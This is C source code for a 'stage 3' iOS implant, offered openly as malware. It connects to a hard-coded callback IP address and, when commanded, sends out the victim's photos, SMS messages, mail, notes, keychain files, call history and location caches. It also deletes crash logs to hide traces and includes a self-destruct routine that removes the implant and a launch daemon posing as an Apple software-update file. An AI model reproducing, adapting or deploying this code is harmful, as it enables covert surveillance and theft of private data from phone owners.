#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

/*
 * STAGE 3: Implant
 * iOS 18.3.1
 */

#define CALLBACK_IP   "94.141.97.36"
#define CALLBACK_PORT 443

void suppress_traces(void) {
    signal(SIGSEGV, SIG_IGN);
    signal(SIGBUS, SIG_IGN);
    signal(SIGABRT, SIG_IGN);
    signal(SIGKILL, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    rmdir("/var/mobile/Library/Logs/CrashReporter/");
    unlink("/var/mobile/Library/Logs/CrashReporter/.placeholder");
}

void send_file(int sock, const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    send(sock, path, strlen(path), 0);
    send(sock, "\n", 1, 0);
    send(sock, &size, sizeof(size), 0);
    char buf[8192];
    long rem = size;
    while (rem > 0) {
        long chunk = rem > 8192 ? 8192 : rem;
        long n = fread(buf, 1, chunk, f);
        if (n <= 0) break;
        send(sock, buf, n, 0);
        rem -= n;
    }
    fclose(f);
}

void send_dir(int sock, const char *path) {
    DIR *d = opendir(path);
    if (!d) return;
    struct dirent *e;
    while ((e = readdir(d))) {
        if (e->d_name[0] == '.') continue;
        char full[2048];
        snprintf(full, sizeof(full), "%s/%s", path, e->d_name);
        if (e->d_type == DT_DIR) send_dir(sock, full);
        else send_file(sock, full);
    }
    closedir(d);
}

void download_photos(int sock) {
    const char *dirs[] = {
        "/var/mobile/Media/DCIM/100APPLE",
        "/var/mobile/Media/DCIM/101APPLE",
        "/var/mobile/Media/DCIM/102APPLE",
        "/var/mobile/Media/PhotoStreamsData",
        "/var/mobile/Media/Photos",
        NULL
    };
    for (int i = 0; dirs[i]; i++) send_dir(sock, dirs[i]);
}

void download_all(int sock) {
    download_photos(sock);
    send_dir(sock, "/var/mobile/Library/SMS");
    send_dir(sock, "/var/mobile/Containers/Data");
    send_dir(sock, "/var/mobile/Documents");
    send_dir(sock, "/var/mobile/Library/Notes");
    send_dir(sock, "/var/mobile/Library/Mail");
    send_dir(sock, "/var/mobile/Library/Keychain");
    send_dir(sock, "/var/mobile/Library/CallHistory");
    send_dir(sock, "/var/mobile/Library/Caches/locationd");
    send_dir(sock, "/var/mobile/Media");
}

void self_destruct(void) {
    unlink("/var/root/.daemon/implant");
    unlink("/Library/LaunchDaemons/com.apple.softwareupdate.plist");
    rmdir("/var/mobile/Library/Logs/");
    rmdir("/tmp/");
}

void stage3_implant(void) {
    suppress_traces();

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in srv;
    srv.sin_family = AF_INET;
    srv.sin_port = htons(CALLBACK_PORT);
    srv.sin_addr.s_addr = inet_addr(CALLBACK_IP);

    for (int i = 0; i < 3; i++) {
        if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0) break;
        sleep(2);
    }

    char hello[256];
    snprintf(hello, sizeof(hello), "iPhone iOS 18.3.1\n");
    send(sock, hello, strlen(hello), 0);

    char cmd[32];
    while (1) {
        memset(cmd, 0, sizeof(cmd));
        if (recv(sock, cmd, sizeof(cmd)-1, 0) <= 0) break;
        if (strcmp(cmd, "PHOTOS") == 0) { download_photos(sock); send(sock, "PHOTOS_DONE\n", 12, 0); }
        else if (strcmp(cmd, "ALL") == 0) { download_all(sock); send(sock, "ALL_DONE\n", 9, 0); }
        else if (strcmp(cmd, "WIPE") == 0) { self_destruct(); break; }
    }
    close(sock);
}
